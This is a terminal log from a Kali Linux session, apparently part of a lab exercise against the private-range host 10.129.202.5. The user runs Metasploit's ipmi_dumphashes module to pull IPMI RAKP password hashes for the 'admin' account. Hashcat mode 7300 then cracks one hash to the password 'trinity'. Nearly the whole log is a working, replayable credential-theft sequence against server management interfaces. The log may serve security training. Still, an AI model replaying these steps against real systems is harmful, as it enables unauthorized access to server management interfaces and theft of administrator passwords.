                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole
[sudo] password for kali: 
Metasploit tip: Writing a custom module? After editing your module, why not try 
the reload command
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.5-dev                           ]
+ -- --=[ 2413 exploits - 1242 auxiliary - 423 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search ipmi

Matching Modules
================

   #   Name                                                                Disclosure Date  Rank    Check  Description
   -   ----                                                                ---------------  ----    -----  -----------
   0   auxiliary/scanner/ipmi/ipmi_cipher_zero                             2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1   auxiliary/scanner/ipmi/ipmi_dumphashes                              2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2   auxiliary/scanner/ipmi/ipmi_version                                 .                normal  No     IPMI Information Discovery
   3   exploit/multi/upnp/libupnp_ssdp_overflow                            2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4     \_ target: Automatic                                              .                .       .      .
   5     \_ target: Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1  .                .       .      .
   6     \_ target: Axis Camera M1011 5.20.1 UPnP/1.4.1                    .                .       .      .
   7     \_ target: Debug Target                                           .                .       .      .
   8   auxiliary/scanner/http/smt_ipmi_cgi_scanner                         2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   9   auxiliary/scanner/http/smt_ipmi_49152_exposure                      2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   10  auxiliary/scanner/http/smt_ipmi_static_cert_scanner                 2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   11  exploit/linux/http/smt_ipmi_close_window_bof                        2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   12  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal              2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal


Interact with a module by name or index. For example info 12, use 12 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal

msf6 > 1
[-] Unknown command: 1. Run the help command for more details.
msf6 > use 1
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                                                                                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE ~/ipmi_hash
OUTPUT_HASHCAT_FILE => ~/ipmi_hash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.202.5
RHOSTS => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.202.5:623 - IPMI - Hash found: admin:e6c746ea82000000d079cfd44dc156a34e6bdc74df132e1bdc8a957aaaab46b71308ca7bd5b779c8a123456789abcdefa123456789abcdef140561646d696e:c6ddb1452e1432b88ee2c9b24ed493259c5bc4a8
[*] Error: 10.129.202.5: Errno::ENOENT No such file or directory @ rb_sysopen - ~/ipmi_hash
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE ipmi_hash
OUTPUT_HASHCAT_FILE => ipmi_hash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.202.5:623 - IPMI - Hash found: admin:d026151682010000af5221e979981fa41114ed34ccbe0fb599a8cfeb4c129c7c73be8fffa1bdad54a123456789abcdefa123456789abcdef140561646d696e:d0c301401527b8e1d03a2d05564b0fa9d372d4fe
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) >                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ hashcat -a 0 -m 7300 ipmi_hash.txt Downloads/rockyou-40.txt --username
hashcat (v6.2.6) starting
OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

* Device #1: cpu-sandybridge-Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz, 4099/8263 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: Downloads/rockyou-40.txt
* Passwords.: 3957
* Bytes.....: 31220
* Keyspace..: 3957
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

d026151682010000af5221e979981fa41114ed34ccbe0fb599a8cfeb4c129c7c73be8fffa1bdad54a123456789abcdefa123456789abcdef140561646d696e:d0c301401527b8e1d03a2d05564b0fa9d372d4fe:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: d026151682010000af5221e979981fa41114ed34ccbe0fb599a...72d4fe
Time.Started.....: Sun May 19 05:49:03 2024 (0 secs)
Time.Estimated...: Sun May 19 05:49:03 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Downloads/rockyou-40.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1941.1 kH/s (1.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3957/3957 (100.00%)
Rejected.........: 0/3957 (0.00%)
Restore.Point....: 0/3957 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> maddie1
Hardware.Mon.#1..: Util: 17%

Started: Sun May 19 05:49:02 2024
Stopped: Sun May 19 05:49:05 2024
